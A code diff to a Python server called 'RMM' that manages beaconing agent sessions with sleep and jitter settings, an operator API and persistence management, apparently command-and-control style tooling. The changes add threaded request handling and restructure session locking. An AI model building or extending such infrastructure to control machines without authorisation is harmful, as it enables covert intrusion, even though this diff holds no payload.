@@ -14,7 +14,7 @@ Enhanced Features:
 - Persistence management
 """
 
-from http.server import HTTPServer, BaseHTTPRequestHandler
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 import argparse
 import re
 import secrets
@@ -489,16 +489,16 @@ class RMMServer:
         return events
     
     def register_session(self, session_id, hostname, username, ip=None):
+        to_save = None
+        is_new = False
         with self.session_lock:
             if session_id in self.killed_sessions:
                 return None
             if session_id not in self.sessions:
                 session = Session(session_id, hostname, username, ip)
                 self.sessions[session_id] = session
-                self.save_session(session)
-                self.log(f"New session: {session}", "SUCCESS")
-                self.event_hub.broadcast_sessions(self.sessions_to_json())
-                return True
+                to_save = session
+                is_new = True
             else:
                 s = self.sessions[session_id]
                 s.last_seen = datetime.now()
@@ -506,8 +506,14 @@ class RMMServer:
                 s.username = username
                 if ip is not None:
                     s.ip = ip
-                self.save_session(s)
-                return False
+                to_save = s
+        if to_save is not None:
+            self.save_session(to_save)
+        if is_new:
+            self.log(f"New session: {to_save}", "SUCCESS")
+            self.event_hub.broadcast_sessions(self.sessions_to_json())
+            return True
+        return False
     
     def update_session_config(self, session_id, sleep_seconds=None, jitter_percent=None):
         session = self.get_session(session_id)
@@ -517,7 +523,7 @@ class RMMServer:
                     session.sleep_seconds = max(1, min(3600, sleep_seconds))
                 if jitter_percent is not None:
                     session.jitter_percent = max(0, min(100, jitter_percent))
-                self.save_session(session)
+            self.save_session(session)
             return True
         return False
     
@@ -1530,9 +1536,11 @@ def main():
     server = RMMServer()
     RMMHandler.server_instance = server
 
-    http_server = HTTPServer((LISTEN_HOST, PORT), RMMHandler)
+    # ThreadingHTTPServer: beacons (/cmd, /result), operator API, and WebSocket run concurrently.
+    http_server = ThreadingHTTPServer((LISTEN_HOST, PORT), RMMHandler)
+    http_server.daemon_threads = True
 
-    print(f"{Colors.GREEN}[*] RMM listening on {LISTEN_HOST}:{PORT}{Colors.END}")
+    print(f"{Colors.GREEN}[*] RMM listening on {LISTEN_HOST}:{PORT} (threaded HTTP){Colors.END}")
     print(f"{Colors.CYAN}[*] Operator API: http://127.0.0.1:{PORT}{API_PREFIX}/{Colors.END}")
     print(f"{Colors.CYAN}[*] Web UI: http://127.0.0.1:{PORT}/ui/{Colors.END}")
     print(f"{Colors.CYAN}[*] CLI: python rmm_cli.py --url http://127.0.0.1:{PORT}{Colors.END}")
